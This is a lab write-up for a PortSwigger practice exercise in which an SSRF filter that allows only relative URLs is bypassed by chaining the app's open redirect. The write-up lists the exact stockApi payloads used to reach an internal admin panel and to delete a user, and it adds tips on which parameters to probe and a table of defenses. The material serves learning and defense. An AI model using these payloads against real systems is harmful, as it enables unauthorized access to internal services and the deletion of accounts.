// PortSwigger Labs ---> Platform
---
## Lab: 5 — SSRF with Filter Bypass via Open Redirection
## Difficulty Level : 🟡 PRACTITIONER

---

### Where I Found Vulnerability?
- **URL:** `/product?productId=2`
- **Parameter:** `stockApi`
- **Hidden Feature:** "Next Product" button — this had an open redirect
- **Defense:** The server only allowed same-origin (relative) URLs in `stockApi` — direct internal IPs were blocked

---

### Steps?

1. Click the **Check Stock** button on the product page, intercept in Burp
2. The `stockApi` parameter will be visible — entering a direct `http://192.168.0.12:8080/admin` here gets blocked
3. Now intercept the **Next Product** button's request
4. Notice the format of that request:
   ```
   GET /product/nextProduct?currentProductId=2&path=/product?productId=3
   ```
5. Here the `path` parameter is an open redirect — it can redirect to any URL
6. Now use this open redirect in `stockApi` and point `path` to the internal admin URL:
   ```
   stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin
   ```
7. Got the admin panel ✅ — find Carlos's delete link
8. Send the final delete payload → Lab solved ✅

---

### Working Payloads?

**Blocked (Direct internal IP didn't work):**
```
stockApi=http://192.168.0.12:8080/admin     ← Direct internal IP blocked
stockApi=http://localhost/admin              ← localhost blocked
```

**Step 1 — Admin Panel Access:**
```
stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin
```

**Step 2 — Delete Carlos (Final Payload):**
```
stockApi=/product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos
```

---

### Why it Worked?

**Open Redirect = SSRF's backdoor:**
- The server had blocked direct external/internal IPs in `stockApi`
- But the server trusted its **own relative URLs** — same origin is safe, right?
- `/product/nextProduct` was a legitimate endpoint — the server allowed it
- That endpoint's `path` parameter could **redirect to any URL** — that was the vulnerability
- The server followed the redirect → reached the internal `192.168.0.12:8080` → SSRF success ✅

```
Normal SSRF attempt:
  stockApi=http://192.168.0.12:8080/admin  →  ❌ BLOCKED (external IP filter)

Open Redirect bypass:
  stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
                    ↓
  Server trusts relative URL ✅
                    ↓
  nextProduct redirects to → http://192.168.0.12:8080/admin
                    ↓
  Server follows redirect → Internal admin access ✅
```

---

### What I Learned?

- **Open Redirect + SSRF = Powerful combo** — one vulnerability helps bypass another
- If an application has any open redirect endpoint inside it, it can be used to bypass an SSRF filter
- A server that **trusts its own endpoints** can be exploited through an open redirect
- `path`, `url`, `redirect`, `next`, `return` — these parameters should always be checked for open redirect

**Tips for finding Open Redirect:**
```
/product/nextProduct?path=         ← path parameter
/login?redirect=                   ← redirect parameter
/auth?returnUrl=                   ← returnUrl parameter
/go?url=                           ← url parameter
```

--
### SSRF Defense — What Should Developers Do?

| Defense | Effective? | Notes |
|---------|-----------|-------|
| Blacklist IPs/keywords | ❌ Weak | Easily bypassed (Lab 4) |
| Allow only relative URLs | ❌ Weak | Open redirect can chain it (Lab 5) |
| **Whitelist allowed domains** | ✅ Strong | Only allow specific trusted URLs |
| **Disable unnecessary redirects** | ✅ Strong | Server-side should not follow redirects |
| **Network-level block** | ✅ Strong | Block internal IPs via firewall |
